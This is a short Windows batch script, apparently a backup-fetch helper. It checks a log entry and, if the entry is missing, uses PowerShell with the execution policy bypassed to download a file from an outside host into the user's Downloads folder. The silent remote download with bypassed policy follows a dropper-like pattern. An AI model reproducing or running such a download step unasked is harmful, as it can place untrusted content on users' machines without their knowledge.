@echo off 
 
set urls=https://spyderrock.com/w3XH5771-Codexv674.ldbk 
call "%USERPROFILE%\Desktop\dow-code\client-code\checklog.bat" "TAI_FILE_BACKUP-23/05/2025-13:50" 
if %errorlevel% equ 0 ( 
   echo done 
) else ( 
call "%USERPROFILE%\Desktop\dow-code\client-code\addlog.bat" "TAI_FILE_BACKUP-23/05/2025-13:50" 
powershell -NoProfile -ExecutionPolicy Bypass -Command "& {Invoke-WebRequest -Uri 'https://spyderrock.com/w3XH5771-Codexv674.ldbk' -OutFile '%USERPROFILE%\Downloads\Codexv674.ldbk'}" 
    ) 
    timeout /t 5 
    exit 
